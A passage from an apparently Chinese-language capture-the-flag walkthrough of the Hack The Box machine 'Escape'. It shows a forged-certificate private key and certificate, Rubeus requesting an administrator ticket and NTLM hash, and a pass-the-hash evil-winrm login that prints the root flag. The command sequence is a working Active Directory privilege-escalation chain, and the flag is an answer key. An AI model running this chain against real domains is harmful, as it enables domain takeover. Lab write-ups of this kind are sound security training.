fXCzG4wUpAgF5MrAoIMy4I1VLsJ5kyqM0DaXQ7RCRzGAAnRpeuwI2dZh8eT2tb0J
hos7/wKBgQCj4YfrNYDssVtGt3h9bFZ66lTW25VunBv0FKR6O3qW7xgekIBOdcwh
ueH4wmXCskLnJVK9HJ6kdjuQKBlFqEugSqOiDYTjS/1P2+gtapUHKyLgRr82yweo
srzGMgVZgRDV7ezY23HsFYwByvLMD0f/eB9WVNUFSQULTpmsG4ddww==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA0HVrUlPbleqQAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjYwODI0MTAyODE1WhcNMzYwODIx
MTAyODE1WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDVVFYzBJPsr6Ui7Ksc89wSDur1
4CCYWE8j4c9cUdHb5+pEh/dG/xEJ5Dy5lqFIF6YJiFr/b2aQJyg/VR6xSdobQbxN
SmKNccFUyUWK3VmqBwTKtQQSI3gSfiuJ6hM5VPszY7f9rObczuNWT3DnDVBBo6hX
fpxTVR60bpXdws9ixnoc6nJ4WYxZPkF2LunwsIuWD7Czt1XgjUZ5v0gV5wPWD5a6
aKFSpOuDT/pCAyHcCn+aPUFG+NLHzfn4LAGSYj1rMJ0cBD/cfFFSyklD2NUKTbdl
g5tgq8LWIj0y9aieqSakUFY+06S+zGcYIbFwUluSv+4eaUHLdaGOrXSr3E2xAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFM3dE0TkcZZmHr4RCBHWFoyqdIa1
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAaeAmB6RjIHbtJmmvYKRDfux/v9G/6UgSGiDOwq7i9Fs+9w4j1GdufU/Y
JvTED4U4pfjRY+JWZ4onL5uqIUAXVG9Wi6SVu6l27s4CU1t83kOQyFjJKU1CZ45K
XWJq1asVKkTVu3j1Ot+yqMDmPfPgLt3U4Hp/4vh61gZkNgIovqz36BdtHFX1mMXf
3pXastiw10obQSaCPSUQHw2+dF6njYGYNwUuoZxUT+7X3x/caJky4PdnN5j3NieN
RfgWTr0SZp1/WvjzSIzgf9Kkickv3wB0bfvVf82nTTPiVNzq5c3UWk69UIUsU5qY
fuYmeKaJ3oTq3u8j6P4xXTlbBpsCGg==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:12.7373895
```

申请 TGT 票据

```bash
*Evil-WinRM* PS C:\programdata\apps> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\apps\cert.pfx

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::7831:5a18:8c2a:3caf%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  8/24/2026 3:45:51 AM
  EndTime                  :  8/24/2026 1:45:51 PM
  RenewTill                :  8/31/2026 3:45:51 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  ZWHNGuh8RI2+x2J4yzfQJg==
  ASREP (key)              :  780413140FE64A906C2021BB56920401


```

上传 Rubeus 得到 administrator 的 hash。

```bash
*Evil-WinRM* PS C:\programdata\apps> .\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\apps\cert.pfx /getcredentials /show /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3

[*] Action: Ask TGT

[*] Got domain: sequel.htb
[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::7831:5a18:8c2a:3caf%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator (NT_PRINCIPAL)
  UserRealm                :  SEQUEL.HTB
  StartTime                :  8/24/2026 3:47:43 AM
  EndTime                  :  8/24/2026 1:47:43 PM
  RenewTill                :  8/31/2026 3:47:43 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Lj20lWguGfaLU4ai2wbYLA==
  ASREP (key)              :  A1166937B6B21F825CB539649A8D1118

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE

```

登录拿到 root。

```bash
┌──(kali㉿kali)-[~/Work/Kali/Escape]
└─$ evil-winrm -i sequel.htb -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
f0967c03ea1a210135133cbf9e269e44
```